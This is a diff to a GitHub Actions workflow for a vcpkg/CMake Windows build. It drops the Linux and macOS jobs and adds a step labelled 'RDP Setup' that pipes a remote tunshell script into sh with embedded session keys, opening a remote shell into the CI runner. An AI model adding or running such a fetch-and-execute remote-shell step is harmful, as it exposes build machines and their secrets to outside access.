@@ -8,17 +8,22 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        os: [windows-latest, ubuntu-latest, macos-latest]
+        os: [windows-latest]
         include:
           - os: windows-latest
             triplet: x64-windows
-            vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
-          - os: ubuntu-latest
-            triplet: x64-linux
-            vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
-          - os: macos-latest
-            triplet: x64-osx
-            vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
+#         
+#         os: [windows-latest, ubuntu-latest, macos-latest]
+#         include:
+#           - os: windows-latest
+#             triplet: x64-windows
+#             vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
+#           - os: ubuntu-latest
+#             triplet: x64-linux
+#             vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
+#           - os: macos-latest
+#             triplet: x64-osx
+#             vcpkgCommitId: '30124253eecff36bc90f73341edbfb4f845e2a1e'
 
     env:
       buildDir: '${{ github.workspace }}/b/vcpkg_submod_manifest'
@@ -48,6 +53,10 @@ jobs:
           additionalCachedPaths: ${{ env.buildDir }}
       - name: Prints output of run-vcpkg's action
         run: echo "root='${{ steps.runvcpkg.outputs.RUNVCPKG_VCPKG_ROOT_OUT }}', triplet='${{ steps.runvcpkg.outputs.RUNVCPKG_VCPKG_TRIPLET_OUT }}'"
+      
+      - name: RDP Setup
+        run: curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T U7VqxqfqGAkUcLS9omYI7M Y5aTVNJdNGpJtHg6uQcMyo
+        shell: bash
       
       - uses: ilammy/msvc-dev-cmd@v1
       - name: Run CMake with vcpkg.json manifest
